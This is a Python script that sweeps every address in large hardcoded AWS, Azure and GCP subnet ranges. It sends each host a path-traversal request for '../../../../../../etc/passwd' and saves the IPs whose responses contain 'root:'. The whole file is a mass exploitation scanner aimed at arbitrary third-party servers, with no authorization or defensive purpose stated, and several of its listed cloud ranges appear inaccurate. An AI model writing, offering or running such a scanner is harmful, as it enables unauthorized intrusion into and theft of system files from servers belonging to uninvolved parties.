import requests
import ipaddress

# Define the cloud provider subnets
cloud_subnets = {
    'AWS': [
        '3.0.0.0/8',
        '15.0.0.0/8',
        '35.0.0.0/8',
        '52.0.0.0/8',
        '54.0.0.0/8',
        '99.0.0.0/8',
        '100.64.0.0/10',
        '102.0.0.0/8',
        '107.20.0.0/14',
        '172.96.0.0/12',
        '174.129.0.0/16',
        '184.72.0.0/15',
        '184.169.128.0/17',
        '185.48.120.0/22',
        '192.5.40.0/21'
    ],
    'Azure': [
        '40.64.0.0/10',
        '52.136.0.0/13',
        '102.64.0.0/13',
        '104.208.0.0/12',
        '131.228.0.0/15',
        '168.61.0.0/16'
    ],
    'GCP': [
        '35.190.0.0/17',
        '35.190.128.0/18',
        '35.192.0.0/14',
        '35.196.0.0/15',
        '35.198.0.0/16',
        '35.199.0.0/17',
        '35.199.128.0/18',
        '35.200.0.0/13',
        '35.208.0.0/12'
    ]
}

# Prompt the user to select a cloud provider
cloud_provider = input("Select a cloud provider (AWS, Azure, or GCP): ")

# Check if the selected cloud provider is valid
if cloud_provider not in cloud_subnets:
    print("Invalid cloud provider.")
    exit()

# Get the subnets for the selected cloud provider
subnets = cloud_subnets[cloud_provider]

# Define the payload for the GET request
payload = '../../../../../../etc/passwd'

# Save the matching IP addresses to a file
output_file = f'matching_ips_{cloud_provider}.txt'
with open(output_file, 'w') as file:
    for subnet in subnets:
        for ip in ipaddress.ip_network(subnet).hosts():
            url = f'http://{ip}/{payload}'
            try:
                response = requests.get(url)
                if 'root:' in response.text:
                    file.write(f'{ip}\n')
            except requests.exceptions.RequestException:
                continue

print(f"Matching IP addresses for {cloud_provider} saved to {output_file}.")
